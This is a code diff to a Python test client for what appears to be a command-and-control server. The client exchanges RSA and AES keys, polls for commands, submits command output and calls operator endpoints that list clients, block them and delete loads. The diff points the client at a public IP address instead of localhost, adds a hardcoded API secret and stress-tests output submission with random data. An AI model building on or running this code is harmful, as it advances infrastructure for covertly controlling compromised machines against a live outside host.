@@ -13,8 +13,8 @@ import hashlib
 import time
 import rsa
 
-SERVER_ADDRESS = "http://127.0.0.1:9999"
-API_SECRET = "debug"
+SERVER_ADDRESS = "http://213.248.43.36"
+API_SECRET = "km2[yqZTb;r{xDg]WB)Cf"
 
 def encrypt_data_withkey(plaintext, key):
     cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=default_backend())
@@ -42,14 +42,13 @@ client_bytes = secrets.token_bytes(32)
 
 keydata = b'''
 -----BEGIN RSA PUBLIC KEY-----
-MIIBCgKCAQEAuKxmbcHaXTmyXfWf1JxNvJD2Fn/KQ5RdtfHVrFCmTkAJufaCOtlZ
-8tw0Q2a1sowfyBcvLuXr6pYO0CRsn6S9pi3GxRbvPoyNZvtIotKIVFBEMttmt6Uw
-xIaH1TRitX/KbpYsXIsvhj5szQnXRl9Yj/mZIpPvZb2+lHJF3BXW8HZO21aaBlbi
-p6QPF++bX+tMn+8rRPJAGGgNiUvScgf8R8SkBncMW9IU0tDLzpnD7jNOOKB+ldJK
-LFbSu+VPkMCaalHCfOyD1tZSGsqYGk4iWbc/qf38cHixbaMz7CLYfN3ExEQ/yN6z
-hdGL7XB6H2KSsjCmbFzCZTslgt9fCo10twIDAQAB
+MIIBCgKCAQEAzg50Mj2uYOR0ehjeR/g9FjXmBTg0hAV2YWZI/V+ww2qsQ6YLe0i3
+gGaTQYdgt1sAw9yyBVJodCFjiJ1y+gjZuivlJrfVeMQ6gF8ZZ4unkVndYLHmBGcL
+DBfdgOJ9GnK6DCt/uLvRbEXEvQiv62av1OekuPnLZMmqruewmxPQP7rNZtqTku6U
+/9maPpPiTymlJQEKcsqWFsdbZZqbJcPc9ddzYoM3Z3+yX4njXWIKrqPXX9cqpOis
+ARH/rnst1AuP7BaSYjAi55OHOdnfOodUrqas7uCo0mt61ZC97eXm6AY/x/8B3NT7
+Ka4TK1JnaXOLvoysj7RFu/SZU7xpgRAfKwIDAQAB
 -----END RSA PUBLIC KEY-----
-
 '''
 
 encrypted_message = encrypt_data_withkey(
@@ -121,13 +120,25 @@ if decrypted_response != "Ok":
             "action": "submit_output",
             "client_id": client_id,
             "command_id": json.loads(decrypted_response)["command_id"],
-            "output": "Example Output"
+            "output": base64.b64encode(secrets.token_bytes(100000)).decode("utf-8")
         }), new_encryption_key)
     )
     decrypted_response = decrypt_data_withkey(submit_output.text, new_encryption_key).decode("utf-8")
     print(f"{decrypted_response}\n{'_'*50}")
 
 # //-------------------------------------- Server Endpoints --------------------------------------\\
+
+
+print("[?] Get output list for specific client")
+get_client_outputs = requests.post(
+    SERVER_ADDRESS + "/api/get_output",
+    json.dumps({
+        "api_secret": API_SECRET,
+        "client_id": client_id,
+    }),
+)
+print(f"{get_client_outputs.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
+
 
 '''
 print("[?] Blocking Client")
@@ -150,16 +161,6 @@ get_clients_list = requests.post(
 )
 
 print(f"{get_clients_list.text[:500]}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
-
-print("[?] Get output list for specific client")
-get_client_outputs = requests.post(
-    SERVER_ADDRESS + "/api/get_output",
-    json.dumps({
-        "api_secret": API_SECRET,
-        "client_id": "70507b96347c4a47",
-    }),
-)
-print(f"{get_client_outputs.text}\n{Fore.CYAN}{'_'*50}{Fore.RESET}")
 
 '''
 print("[?] Delete load")
